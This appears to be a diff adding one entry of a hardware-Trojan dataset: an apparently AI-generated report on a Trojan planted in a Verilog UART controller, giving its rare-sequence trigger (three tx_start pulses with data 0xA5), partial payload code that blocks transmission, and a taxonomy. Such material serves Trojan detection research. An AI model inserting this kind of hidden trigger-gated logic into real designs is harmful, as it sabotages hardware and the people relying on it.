@@ -1,0 +1,60 @@
+Design: uart_controller.v
+Vulnerability ID: T3
+Model: gpt-4.1
+Attempts: 1
+
+Explanation:
+A Trojan was inserted that monitors for a rare sequence of three consecutive tx_start events with tx_data == 8'hA5, and then disables the UART controller for a fixed period, temporarily blocking transmission.
+
+Trigger:
+The Trojan is triggered by three consecutive tx_start pulses where tx_data equals 8'hA5 (10100101), an unlikely sequence during normal operation.
+
+Payload:
+Count down, then deactivate trojan
+            if (trojan_counter != 0)
+                trojan_counter <= trojan_counter - 1'b1;
+            if (trojan_counter == 1)
+                trojan_active <= 1'b0;
+        end
+        // trojan_insertion_end //
+        else if (tx_start && !tx_busy) begin
+            // trojan_insertion_begin //
+            if (!trojan_active) begin
+            // trojan_insertion_end //
+                shift_reg <= tx_data;
+                tx_busy <= 1'b1;
+                tx <= 1'b0; // start bit
+                bit_count <= 4'h0;
+            // trojan_insertion_begin //
+            end
+            // When trojan active, ignore tx_start and do not initiate new transaction
+            // trojan_insertion_end //
+        end else if (tx_busy) begin
+            if (bit_count < 8) begin
+                tx <= shift_reg[0];
+                shift_reg <= {1'b0, shift_reg[7:1]};
+                bit_count <= bit_count + 1;
+            end else begin
+                tx <= 1'b1; // stop bit
+                tx_busy <= 1'b0;
+            end
+        end else begin
+            // trojan_insertion_begin //
+            // Ensure outputs held when module is disabled
+            if (trojan_active) begin
+                tx <= 1'b1;
+                tx_busy <= 1'b0;
+            end
+            // trojan_insertion_end //
+        end
+    end
+endmodule
+>
+
+Taxonomy:
+Insertion phase: Design  
+Abstraction level: Register-transfer level  
+Activation mechanism: Triggered internally by rare event sequence  
+Effects: denial of service  
+Location: I/O  
+Characteristics: Distributed, small, Functional Trojan
